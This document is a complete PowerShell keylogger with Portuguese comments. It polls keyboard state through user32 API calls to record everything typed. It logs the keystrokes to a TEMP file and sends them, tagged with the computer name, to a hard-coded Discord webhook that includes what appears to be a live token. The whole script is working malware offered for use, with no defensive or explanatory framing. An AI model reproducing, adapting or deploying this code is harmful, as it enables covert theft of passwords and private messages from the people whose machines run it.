# ========================= Keylogger Final ============================
# Webhook do Discord (substitua se necessário)
$dc = "https://discord.com/api/webhooks/1374929206877880464/48Gjp9K8Z_jh90Cjw_h8jSMlkHBKHTrhUXsgU64nP4j07_hWbHbaUP9BTEf_ISdUW7I4"

# Importa funções da DLL user32
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Configuração de tempo
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Loop contínuo
While ($true) {
    $keyPressed = $false
    try {
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++) {
                $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    $kbst = New-Object Byte[] 256
                    $API::GetKeyboardState($kbst) | Out-Null
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        $LString = $logchar.ToString()
                        if ($asc -eq 8)  {$LString = "[BKSP]"}
                        if ($asc -eq 13) {$LString = "[ENT]"}
                        if ($asc -eq 27) {$LString = "[ESC]"}
                        $send += $LString
                    }
                }
            }
        }
    }
    finally {
        if ($keyPressed) {
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $escmsg = "$timestamp - $send"

            # LOG local para debug
            "$escmsg`n---" | Out-File "$env:TEMP\logger-debug.txt" -Append

            # Envio para Discord
            $payload = @{
                username = "$env:COMPUTERNAME"
                content  = $escmsg
            } | ConvertTo-Json -Compress

            try {
                Invoke-RestMethod -Uri $dc -Method Post -Body $payload -ContentType 'application/json'
            } catch {
                "$timestamp - Erro ao enviar para Discord: $_" | Out-File "$env:TEMP\logger-debug.txt" -Append
            }

            $send = ""
            $keyPressed = $false
        }
    }

    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}
